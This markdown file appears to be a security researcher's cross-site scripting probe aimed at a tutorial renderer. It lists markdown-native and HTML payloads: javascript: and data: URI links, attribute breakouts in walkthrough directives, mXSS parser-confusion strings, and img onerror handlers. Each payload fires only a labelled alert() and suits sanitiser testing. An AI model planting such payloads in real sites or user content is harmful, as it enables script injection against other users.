# OiCS tutorial XSS probe 2 — markdown-native vectors

## markdown link javascript:

[click-js](javascript:alert('MD-LINK-JS:'+document.domain))

## markdown autolink

<javascript:alert('AUTOLINK:'+document.domain)>

## markdown image javascript:

![img-js](javascript:alert('MD-IMG:'+document.domain))

## reference link

[ref-click][evilref]

[evilref]: javascript:alert('REF-LINK:'+document.domain) "title"

## data uri link

[click-data](data:text/html;base64,PHNjcmlwdD5hbGVydCgnREFULVVSSScpPC9zY3JpcHQ+)

## directive attribute breakout single-quote

<walkthrough-spotlight-pointer spotlightId='x"><img src=x onerror=alert("SQ-BREAK")>'></walkthrough-spotlight-pointer>

## directive attribute breakout double-quote

<walkthrough-spotlight-pointer spotlightId="x'><img src=x onerror=alert('DQ-BREAK')>"></walkthrough-spotlight-pointer>

## pre syntax attribute

<pre syntax='x"><script>alert("PRE-SYNTAX")</script>'>
echo hello
</pre>

## mxss parser confusion

<scri<script>pt>alert('MXSS1')</scri</script>pt>

<<script>alert('MXSS2')<</script>

<div><script>alert('NESTED-DIV-SCRIPT')</script></div>

## html comment smuggle

<!-- <script>alert('COMMENT')</script> -->

## markdown inside html block

<div markdown="1">
[inner-js](javascript:alert('INNER-MD'))
</div>

## title with html

# <img src=x onerror=alert('TITLE-IMG')> heading2

## table html

| <img src=x onerror=alert('TABLE')> | b |
|---|---|
| c | d |

## code block javascript protocol handler check

```sh
echo "codeblock copy target"
```
